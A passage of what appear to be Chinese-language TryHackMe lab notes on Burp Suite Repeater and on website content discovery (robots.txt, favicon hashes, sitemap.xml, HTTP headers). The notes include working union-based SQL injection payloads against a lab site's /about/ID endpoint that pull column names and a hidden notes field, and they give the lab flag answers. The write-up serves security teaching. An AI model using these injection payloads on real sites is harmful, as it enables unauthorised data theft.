<p>tips：我们还可以使用”Send”按钮一栏最右侧的两个翻页按钮——向前或者向后浏览我们修改请求的历史记录。</p>
<h3 id="答题-1"><a href="#答题-1" class="headerlink" title="答题"></a>答题</h3><p>阅读本小节内容，并回答以下问题：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231225111241724.png"
                      alt="image-20231225111241724"
                ></p>
<h2 id="消息显示选项栏"><a href="#消息显示选项栏" class="headerlink" title="消息显示选项栏"></a>消息显示选项栏</h2><p>Repeater为我们提供了各种选项来呈现请求消息与响应消息。</p>
<p>以响应消息为例，我们可以通过点击响应视图顶部的四个选项按钮来切换可用的消息显示格式：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230408223350493.png"
                      alt="image-20230408223350493"
                ></p>
<p>我们有以下四个显示选项，它们可以决定响应消息的显示格式(这些选项同样适用于请求消息)：</p>
<ol>
<li>Pretty(美化)：这是默认选项，它会基于原始的响应消息而略微美化其内容格式，这将使得响应消息更容易被阅读；</li>
<li>Raw(原始)：此选项会显示来自于目标服务器的纯粹的、未经美化的响应消息；</li>
<li>Hex(十六进制)：该选项将以字节格式呈现原始的响应消息，这个选项在处理二进制文件时特别有用；</li>
<li>Render(渲染)：如果选择该选项，则会将响应消息渲染成一个可视化页面，这就像我们在浏览器中查看响应页面一样。</li>
</ol>
<p>tips：对于大多数场景，使用Pretty选项通常就足够了，然而，熟悉其他三个选项的用法对于我们而言也是有益的。</p>
<p>在上述的”Render”选项右边有一个<code>\n</code>按钮，<code>\n</code>按钮的含义是”显示不可打印字符”，它允许我们显示通常不会在Pretty格式(或者Raw格式)的视图中显示的字符；例如，如果我们在Pretty格式的响应视图中点击<code>\n</code>按钮，那么响应消息中的每一行结尾都会显示<code>\r\n</code> 字符——即一个回车符后面跟着一个换行符，这些字符在HTTP头的解释中起着重要的作用。</p>
<h3 id="答题-2"><a href="#答题-2" class="headerlink" title="答题"></a><strong>答题</strong></h3><p>阅读本小节内容，并回答以下问题：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231225113129733.png"
                      alt="image-20231225113129733"
                ></p>
<h2 id="Inspector界面"><a href="#Inspector界面" class="headerlink" title="Inspector界面"></a>Inspector界面</h2><p>在很多时候，Inspector是对Repeater模块中的Request视图和Response视图的补充，如果你足够了解如何阅读和编辑HTTP请求，那么你可能会发现你很少需要用到Inspector界面。</p>
<p>Inspector可以在Proxy模块和Repeater模块中使用，在这两种情况下，它都位于对应模块窗口的最右侧，并能为我们提供关于请求消息和响应消息的组件列表：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231226080707519.png"
                      alt="image-20231226080707519"
                ></p>
<p>在上图所示的组件中，与请求消息相关的部分通常可以被修改，通过操作Inspector界面，我们可以添加、编辑和删除一个请求消息分解之后所产生的组件项目；例如，在请求消息的Request Attributes(请求属性)部分，我们可以编辑请求的Path、Method和Protocol——从而可以更改我们所要检索的资源、将GET方法更改为另一种HTTP方法、将协议从HTTP&#x2F;1切换到HTTP&#x2F;2：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231226081340441.png"
                      alt="image-20231226081340441"
                ></p>
<p>在Inspector界面中，除了上面所介绍的Request Attributes部分之外，其他可供我们查看和编辑的部分还包括：</p>
<ul>
<li>Request Query Parameters：”请求查询参数”，此处会引用通过URL发送到服务器的数据；如在<code>https://admin.tryhackme.com/?redirect=false</code> 之类的GET请求中，有一个名为”redirect”的”请求查询参数”，其值为”false”。</li>
<li>Request Body Parameters：”请求主体参数”，它的功能与”请求查询参数”类似，但它特定用于POST请求，我们在POST请求中作为数据发送的内容都将显示在这个”请求主体参数”中，我们可以在重新发送请求之前修改参数。</li>
<li>Request Cookies：”请求cookies”，此部分会包含一个伴随每个请求而被发送的可修改的cookie的列表。</li>
<li>Request Headers：”请求标头”，此部分允许我们查看、访问和修改(包括添加或删除)与我们的请求一起被发送的任何标头；在检查Web服务器会如何响应意外的标头信息时，编辑”请求标头”的内容非常有用。</li>
<li>Response Headers：”响应标头”，此部分将显示Web服务器在响应我们的请求时所发回的标头信息，这部分内容不能被编辑(因为我们不能控制目标服务器将返回给我们什么标头)；请注意，”响应标头”的内容仅在我们向目标Web服务器发送请求并且收到响应后才会显示。</li>
</ul>
<p>tips：虽然Inspector界面中组件的文本表示也可以在请求视图和响应视图中找到，但是Inspector的表格格式为我们提供了一种方便的方式来可视化“消息组件”并与其进行交互；通过使用Inspector，我们可以针对请求消息的相关组件执行字段修改、添加和删除操作，并能查看原始的响应消息会发生什么变化。</p>
<h3 id="答题-3"><a href="#答题-3" class="headerlink" title="答题"></a>答题</h3><p>阅读本小节内容，并回答以下问题：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231226083558838.png"
                      alt="image-20231226083558838"
                ></p>
<p>tips：Request Body Parameters-“请求主体参数”。</p>
<h2 id="简单示例练习"><a href="#简单示例练习" class="headerlink" title="简单示例练习"></a>简单示例练习</h2><p>Repeater允许我们多次发送类似的请求(通常需要对请求进行少量修改)到目标服务器，通过使用Repeater：可以手动测试SQL注入漏洞、尝试绕过Web应用程序的防火墙过滤器、在提交表单时调整相关的参数……</p>
<p>现在，让我们从一个简单的示例开始练习：使用Repeater更改请求消息的标头并发送给目标站点。</p>
<h3 id="答题-4"><a href="#答题-4" class="headerlink" title="答题"></a>答题</h3><p>首先在和本文相关的TryHackMe实验房间中启动目标机器。</p>
<p>在本地Kali机上启动Burp Suite，激活Burp代理插件(浏览器插件)并启用Burp Proxy的拦截功能，然后在浏览器中访问目标站点——在成功抓取到相关请求包之后，我们再将其发送给Repeater模块：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230409104131423.png"
                      alt="image-20230409104131423"
                ></p>
<p>使用Repeater模块的Inspector界面(或者直接在请求视图中手动操作)，在请求消息中添加一个名为FlagAuthorised的标头，并将其值设置为True：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231226184055553.png"
                      alt="image-20231226184055553"
                ></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Headers with FlagAuthorised Added</span></span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 10.10.7.11</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">FlagAuthorised: True</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230409104237418.png"
                      alt="image-20230409104237418"
                ></p>
<p>点击上图中的Send按钮，然后查看响应消息中的flag信息：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230409104256498.png"
                      alt="image-20230409104256498"
                ></p>
<blockquote>
<p>flag内容为：THM{Yzg2MWI2ZDhlYzdlNGFiZTUzZTIzMzVi} 。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231226184138807.png"
                      alt="image-20231226184138807"
                ></p>
<h2 id="挑战任务练习"><a href="#挑战任务练习" class="headerlink" title="挑战任务练习"></a>挑战任务练习</h2><p>停用Burp代理，访问目标网站页面<code>http://10.10.107.186/products/</code>，并尝试点击”See More”链接：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230409112618299.png"
                      alt="image-20230409112618299"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230409112658835.png"
                      alt="image-20230409112658835"
                ></p>
<p>从上图可以看到，我们会被重定向到一个数字端点(如<code>/products/3</code>)，这个端点通常需要验证，以确保我们所尝试导航到的端点是存在的，并且端点所对应的数字需要是一个有效整数；如果目标服务器并没有对数字端点进行充分验证，那么目标网站就可能存在安全风险。</p>
<h3 id="答题-5"><a href="#答题-5" class="headerlink" title="答题"></a><strong>答题</strong></h3><p>tips：本小节的思路是输入意外的端点值以查看服务器将如何响应，例如，我们可以输入一段文字或符号作为端点值，也可以尝试输入一个大于可用产品数量的数字作为端点值，或者输入一个小于或等于 0 的数字作为端点值。</p>
<p>激活Burp代理插件并开启Burp Proxy拦截功能，尝试捕获一个针对目标站点的<code>products</code>页面的包含端点的请求，然后将其转发给Repeater进行修改，我们将请求消息中的端点数值修改为-1，然后点击Send按钮继续发送请求消息：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230409114826258.png"
                      alt="image-20230409114826258"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230409123224633.png"
                      alt="image-20230409123224633"
                ></p>
<blockquote>
<p>flag的内容为：THM{N2MzMzFhMTA1MmZiYjA2YWQ4M2ZmMzhl} 。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231226185617703.png"
                      alt="image-20231226185617703"
                ></p>
<h2 id="综合练习-测试SQLi漏洞"><a href="#综合练习-测试SQLi漏洞" class="headerlink" title="综合练习-测试SQLi漏洞"></a>综合练习-测试SQLi漏洞</h2><p><strong>本小节任务：</strong></p>
<p>目标网站的<code>/about/ID</code>端点页面中的ID参数存在联合SQL注入漏洞，我们需要使用Burp Suite找到此SQL漏洞，然后执行SQLi攻击以检索一个存储在数据库中的关于CEO的注释。</p>
<h3 id="答题-6"><a href="#答题-6" class="headerlink" title="答题"></a><strong>答题</strong></h3><p>激活Burp代理插件并开启Burp Proxy拦截功能，在攻击机上的浏览器中访问 <a class="link"   href="http://10.10.107.186/about/2" >http://10.10.107.186/about/2 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，捕获相关请求并将其发送给Repeater：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230409124842773.png"
                      alt="image-20230409124842773"
                ></p>
<p>现在我们可以对请求消息进行修改测试，为了验证目标页面是否存在SQLi漏洞，我们在端点参数后添加<code>&#39;</code>符号，如果服务器响应”500 Internal Server Error”，则表明我们成功中断了SQL查询：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231226184352285.png"
                      alt="image-20231226184352285"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231226184406727.png"
                      alt="image-20231226184406727"
                ></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Request Headers</span></span><br><span class="line">GET /about/2&#x27; HTTP/1.1</span><br><span class="line">Host: 10.10.107.186</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Response Headers from the Server</span></span><br><span class="line">HTTP/1.1 500 INTERNAL SERVER ERROR</span><br><span class="line">Server: nginx/1.18.0 (Ubuntu)</span><br><span class="line">Date: Mon, 16 Aug 2021 23:05:21 GMT</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 3101</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230409124948001.png"
                      alt="image-20230409124948001"
                ></p>
<p>我们可以查看并分析目标服务器所响应的消息内容，在第 40 行左右，我们可以看到目标服务器返回了过多的提示信息(关于错误的SQL查询)：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231226184454227.png"
                      alt="image-20231226184454227"
                ></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Overly verbose error message showing the query</span></span><br><span class="line">&lt;h2&gt;</span><br><span class="line">    &lt;code&gt;Invalid statement: </span><br><span class="line">        &lt;code&gt;SELECT firstName, lastName, pfpLink, role, bio FROM people WHERE id = 2&#x27;&lt;/code&gt;</span><br><span class="line">    &lt;/code&gt;</span><br><span class="line">&lt;/h2&gt;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230409125205636.png"
                      alt="image-20230409125205636"
                ></p>
<p>通过上图中的提示信息，我们可以获取到以下关键点：</p>
<ol>
<li>与上述页面相关的SQL查询将基于服务器数据库中的<code>people</code>表进行查询；</li>
<li>该SQL查询在<code>people</code>表中选中了五列：<code>firstName</code>、<code>lastName</code>、<code>pfpLink</code>、<code>role</code>以及<code>bio</code>；</li>
</ol>
<p>有了以上这些信息，我们就可以跳过枚举表名和查询部分列名的步骤，但是我们仍然需要找到我们的目标列的名称(以上五列并非是people表的全部列)。</p>
<p>我们可以使用联合查询——选择在默认数据库<code>information_schema</code>的<code>columns</code>表中查询列名，并指定我们要查询的列属于<code>people</code>表。</p>
<p>相关查询语句如下：</p>
<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line">/about/0 UNION ALL SELECT column_name,null,null,null,null FROM information_schema.columns WHERE table_name=&quot;people&quot;</span><br></pre></td></tr></table></figure></div>

<p>上面的SQL语句将创建一个联合查询，这将选择我们所指定的列然后是四个空列(因为<code>UNION</code>关键字前后所查询的列数必须相同，添加空列可避免查询出错)。</p>
<p>tips：在上面的查询语句中，我们还将ID值由 2 更改为 0(将ID设置为无效值)，这可以确保目标服务器只对<code>UNION</code>关键字后面的查询进行响应。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231226184624007.png"
                      alt="image-20231226184624007"
                ></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">The <span class="string">&quot;id&quot;</span> column name <span class="keyword">in</span> the title of the response</span></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.18.0 (Ubuntu)</span><br><span class="line">Date: Mon, 16 Aug 2021 22:12:36 GMT</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Connection: close</span><br><span class="line">Front-End-Https: on</span><br><span class="line">Content-Length: 3360</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=en&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;</span><br><span class="line">            About | id None</span><br><span class="line">        &lt;/title&gt;</span><br><span class="line">-----</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230409135153789.png"
                      alt="image-20230409135153789"
                ></p>
<p>我们成功地从数据库中取出了第一个列名，但是现在页面只显示第一个匹配项——我们需要看到所有匹配项；因此接下来我们可以使用<code>group_concat()</code>函数，这能够将所有列名合并为一个输出：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">/about/0 UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns WHERE table_name=&quot;people&quot;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230409135543209.png"
                      alt="image-20230409135543209"
                ></p>
<p>我们成功地识别了<code>people</code>表中的八列：<code>id</code>, <code>firstName</code>, <code>lastName</code>, <code>pfpLink</code>, <code>role</code>, <code>shortRole</code>, <code>bio</code>和<code>notes</code>。</p>
<p>考虑到我们在本小节中的任务要求，我们想找的目标列应该是<code>notes</code>。</p>
<p>最后，我们要从服务器数据库中提取flag值——我们现在已经有了所需要的全部信息：</p>
<ul>
<li><p>表名：<code>people</code>；</p>
</li>
<li><p>目标列的名称：<code>notes</code>；</p>
</li>
<li><p>CEO对应的ID值应该为：<code>1</code> (这可以通过在<code>/about/</code>页中点击Jameson Wolfe的个人资料，并检查URL中的ID找到)。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230409140821331.png"
                      alt="image-20230409140821331"
                ></p>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230409140750939.png"
                      alt="image-20230409140750939"
                ></p>
<p>让我们构建一个完整的payload来提取flag内容：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">0 UNION ALL SELECT notes,null,null,null,null FROM people WHERE id = 1</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230409140503109.png"
                      alt="image-20230409140503109"
                ></p>
<blockquote>
<p>flag的内容为：THM{ZGE3OTUyZGMyMzkwNjJmZjg3Mzk1NjJh} 。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231226184843113.png"
                      alt="image-20231226184843113"
                ></p>
]]></content>
      <categories>
        <category>TryHackMe笔记</category>
      </categories>
      <tags>
        <tag>TryHackMe</tag>
        <tag>工具使用</tag>
      </tags>
  </entry>
  <entry>
    <title>THM-Content Discovery(网站内容发现)-学习</title>
    <url>/2024/01/27/THM-Content%20Discovery(%E7%BD%91%E7%AB%99%E5%86%85%E5%AE%B9%E5%8F%91%E7%8E%B0)-%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>本文相关的TryHackMe实验房间链接：<a class="link"   href="https://tryhackme.com/room/contentdiscovery" >https://tryhackme.com/room/contentdiscovery <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>通过学习相关知识点：了解在网络服务器上发现可能导致漏洞的隐藏或私人内容的各种方法（网站内容发现也属于信息收集的范畴）。</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>首先，我们应该问，在 Web 应用安全的背景下，什么是网站内容？ 网站内容可以是很多东西：文件、视频、图片、备份、网站功能等。 当我们谈论网站内容发现时，我们不是在谈论我们可以在网站上看到的显而易见的东西，而是指那些网站并没有立即呈现给我们、并不总是供公众使用的网站内容。</p>
<p>例如，该网站内容可以是供员工使用的页面或门户、网站的旧版本、备份文件、配置文件、管理面板等。</p>
<p>我们将介绍在网站上发现内容的三种主要方式：手动发现、自动发现和 OSINT（开源情报）。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112180045286.png"
                      alt="image-20221112180045286"
                ></p>
<h2 id="手动发现网站内容-Robots-txt"><a href="#手动发现网站内容-Robots-txt" class="headerlink" title="手动发现网站内容 - Robots.txt"></a>手动发现网站内容 - Robots.txt</h2><p>我们可以在网站上手动检查多个位置以开始发现更多网站内容。</p>
<p><strong>Robots.txt（在现实环境下该文件可能无法提供信息）</strong></p>
<p>robots.txt 是一个文件，它将告诉搜索引擎哪些页面可以显示在搜索引擎结果中，哪些页面不允许显示在搜索引擎结果中，或者禁止特定搜索引擎完全抓取该网站所有资源。 通常的做法是使用robots.txt 限制该网站的某些区域，使其不会显示在搜索引擎结果中。 </p>
<p>被限制搜索的页面可能是网站客户的管理门户或文件等区域。 robots.txt文件为我们提供了一个网站所有者不希望我们发现的关于网站资源位置的列表。</p>
<p>查看 Acme IT Support 网站（目标示例站点）上的 robots.txt 文件 - 为此，请在 AttackBox 上打开 Firefox，然后输入网址：<a class="link"   href="http://machine_ip/robots.txt" >http://MACHINE_IP&#x2F;robots.txt <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>（此 URL 将在你启动目标机器后 2 分钟更新）</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112182302289.png"
                      alt="image-20221112182302289"
                ></p>
<p>查看目标站点的robots.txt文件：</p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line">http://MACHINE_IP/robots.txt</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112184112691.png"
                      alt="image-20221112184112691"
                ></p>
<h2 id="手动发现网站内容-Favicon"><a href="#手动发现网站内容-Favicon" class="headerlink" title="手动发现网站内容-Favicon"></a>手动发现网站内容-Favicon</h2><p><strong>Favicon</strong></p>
<p>favicon 是一个小图标，显示在浏览器的地址栏或选项卡中，用于品牌化网站。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112184212745.png"
                      alt="image-20221112184212745"
                ></p>
<p>有时，当使用网站框架构建网站时，框架自带的图标会作为安装的一部分而留下，如果网站开发人员没有用自定义图标替换它，这就可以让我们了解当前网站正在使用的框架。</p>
<p> OWASP 托管了一个常见网站框架图标的数据库，你可以使用它来检查目标的favicon（图标）以查看该图标对应的网站框架是什么：</p>
<blockquote>
<p> <a class="link"   href="https://wiki.owasp.org/index.php/OWASP_favicon_database" >https://wiki.owasp.org/index.php/OWASP_favicon_database <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p>一旦我们知道了网站当前使用的框架堆栈，我们就可以使用外部资源来发现更多关于它的信息。</p>
<p><strong>实践练习</strong></p>
<p>在 AttackBox 上，打开 firefox 并输入URL <a class="link"   href="https://static-labs.tryhackme.cloud/sites/favicon/" >https://static-labs.tryhackme.cloud/sites/favicon/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 在这里你会看到一个基本的网站，上面写着“网站即将推出……”，在浏览器的地址选项卡上，你会注意到一个图标，你可以确认该站点正在使用一个网站图标。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112184943441.png"
                      alt="image-20221112184943441"
                ></p>
<p>查看该网页源代码，你会看到源代码第六行包含一个指向 <code>images/favicon.ico</code> 文件的链接。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112185000859.png"
                      alt="image-20221112185000859"
                ></p>
<p>在 AttackBox 上运行以下命令，它将下载目标网页相关的 favicon 并获取其 md5 哈希值，然后你可以通过上面给出的<a class="link"   href="https://wiki.owasp.org/index.php/OWASP_favicon_database" >在线网站 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>查找该图标对应的网站框架：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">user@machine$ </span><span class="language-bash">curl https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.ico | <span class="built_in">md5sum</span></span></span><br></pre></td></tr></table></figure></div>

<p>注意：如果你得到的哈希值以 427e 结尾，那么代表你的 curl命令 失败了，你可能需要再试一次。 </p>
<p>你也可以在 Windows 上的 Powershell 中运行命令，如下所示：</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">curl</span> https://<span class="keyword">static</span><span class="literal">-labs</span>.tryhackme.cloud/sites/favicon/images/favicon.ico <span class="literal">-UseBasicParsing</span> <span class="literal">-o</span> favicon.ico</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-FileHash</span> .\favicon.ico <span class="literal">-Algorithm</span> MD5 </span><br></pre></td></tr></table></figure></div>

<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112185530148.png"
                      alt="image-20221112185530148"
                ></p>
<p>查看目标站点图标：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112184943441.png"
                      alt="image-20221112184943441"
                ></p>
<p>下载目标网页相关的 favicon 并获取其 md5 哈希值：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112185858253.png"
                      alt="image-20221112185858253"
                ></p>
<blockquote>
<p>f276b19aabcb4ae8cda4d22625c6735f</p>
</blockquote>
<p>使用 <a class="link"   href="https://wiki.owasp.org/index.php/OWASP_favicon_database" >https://wiki.owasp.org/index.php/OWASP_favicon_database <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 查找图标hash值对应的网站框架</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112185750144.png"
                      alt="image-20221112185750144"
                ></p>
<h2 id="手动发现网站内容-Sitemap-xml"><a href="#手动发现网站内容-Sitemap-xml" class="headerlink" title="手动发现网站内容-Sitemap.xml"></a>手动发现网站内容-Sitemap.xml</h2><p><strong>Sitemap.xml</strong></p>
<p>与限制搜索引擎爬虫查看范围的 robots.txt 文件不同，sitemap.xml 文件提供了网站所有者希望在搜索引擎上列出的每个文件的列表。 sitemap.xml 文件有时也可能会包含网站中难以导航的区域，甚至会列出当前网站不再使用但仍在幕后工作的一些旧网页。</p>
<p>查看 Acme IT Support 网站（目标示例站点）上的 sitemap.xml 文件，查看是否有我们尚未发现的网站新内容： <a class="link"   href="http://10.10.190.47/sitemap.xml" >http://10.10.190.47/sitemap.xml <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> （在 AttackBox 上的 FireFox 浏览器中打开它 ）。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112190525546.png"
                      alt="image-20221112190525546"
                ></p>
<p>访问目标站点的sitemap文件： <a class="link"   href="http://10.10.190.47/sitemap.xml" >http://10.10.190.47/sitemap.xml <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112190723611.png"
                      alt="image-20221112190723611"
                ></p>
<h2 id="手动发现网站内容-HTTP-Headers（HTTP标头）"><a href="#手动发现网站内容-HTTP-Headers（HTTP标头）" class="headerlink" title="手动发现网站内容-HTTP Headers（HTTP标头）"></a>手动发现网站内容-HTTP Headers（HTTP标头）</h2><p><strong>HTTP标头</strong></p>
<p>当我们向 Web 服务器发出请求时，服务器会返回各种 HTTP 标头。 这些标头有时可能会包含一些有用的信息，例如web服务器软件，可能还有网站 当前正在使用的编程&#x2F;脚本语言。 </p>
<p>在下面的示例中，我们可以看到web服务器是 <strong>NGINX</strong> 版本为 <strong>1.18.0</strong> ，运行的 <strong>PHP</strong> 版本是 <strong>7.4.3</strong>。 通过这些信息，我们可以找到正在使用的易受攻击的相关软件版本。 现在尝试对 Web 服务器运行 curl 命令，使用 <code>-v</code> 开关开启详细模式，这将输出HTTP标头的详细信息（可能会有一些有趣的东西！）。</p>
<p>具体命令和执行结果如下：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">user@machine$ </span><span class="language-bash">curl http://10.10.190.47 -v</span></span><br><span class="line">* Trying 10.10.190.47:80...</span><br><span class="line">* TCP_NODELAY set</span><br><span class="line">* Connected to 10.10.190.47 (MACHINE_IP) port 80 (#0)</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">GET / HTTP/1.1</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">Host: MACHINE_IP</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">User-Agent: curl/7.68.0</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">Accept: */*</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">* Mark bundle as not supporting multiuse</span></span><br><span class="line">&lt; HTTP/1.1 200 OK</span><br><span class="line">&lt; Server: nginx/1.18.0 (Ubuntu)</span><br><span class="line">&lt; X-Powered-By: PHP/7.4.3</span><br><span class="line">&lt; Date: Mon, 19 Jul 2021 14:39:09 GMT</span><br><span class="line">&lt; Content-Type: text/html; charset=UTF-8</span><br><span class="line">&lt; Transfer-Encoding: chunked</span><br><span class="line">&lt; Connection: keep-alive</span><br></pre></td></tr></table></figure></div>

<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112191437605.png"
                      alt="image-20221112191437605"
                ></p>
<p>在攻击机上输入以下命令：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">curl http://10.10.190.47 -v</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112191620475.png"
                      alt="image-20221112191620475"
                ></p>
<blockquote>
<p>THM{HEADER_FLAG}</p>
</blockquote>
